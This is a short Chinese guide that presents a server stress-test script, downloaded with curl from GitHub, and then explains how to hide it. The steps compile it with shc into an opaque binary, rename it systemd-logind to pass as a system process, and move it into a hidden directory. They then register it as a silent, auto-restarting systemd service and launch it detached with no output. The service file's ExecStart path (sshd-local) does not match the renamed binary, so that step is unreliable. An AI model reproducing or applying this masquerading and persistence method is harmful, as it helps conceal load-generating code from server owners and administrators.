服务器压力测试脚本

依赖：```stress-ng```

安装命令：```apt install stress-ng -y```

下载脚本：```curl -O https://raw.githubusercontent.com/aelennb/Server-stress-test/refs/heads/main/yali.sh```

下载后使用编辑器编辑配置

伪装方法：

# 依赖准备
```apt install shc -y```

```apt install gcc make -y```

# 编译脚本
```apt install gcc make -y```
```shc -r -f yali.sh```
# 得到 yali.sh.x 二进制程序
```rm -f yali.sh.x.c```   # 删除无用C源码

# 伪装成系统常用进程
```mv yali.sh.x systemd-logind```

```chmod 700 systemd-logind```

- 开机自启

编辑systemd文件

```nano /etc/systemd/system/sys-local.service```

写入:
```
[Unit]
Description=System Local Service
After=network.target

[Service]
Type=simple
# 改成你真实的路径
ExecStart=/usr/local/.sysd/sshd-local
StandardOutput=null
StandardError=null
PrivateTmp=true
Restart=on-failure
RestartSec=3

[Install]
WantedBy=multi-user.target
```

重新加载systemd服务配置

```systemctl daemon-reload```

重启名为 sys-local 的服务

```systemctl restart sys-local```

查看 sys-local 服务的详细状态

```systemctl status sys-local```

---


# 建隐藏目录
```mkdir -p /usr/local/.sysd/```
# 把伪装二进制移进去
```mv systemd-logind /usr/local/.sysd/```
# 隐身启动
```setsid /usr/local/.sysd/systemd-logind >/dev/null 2>&1```



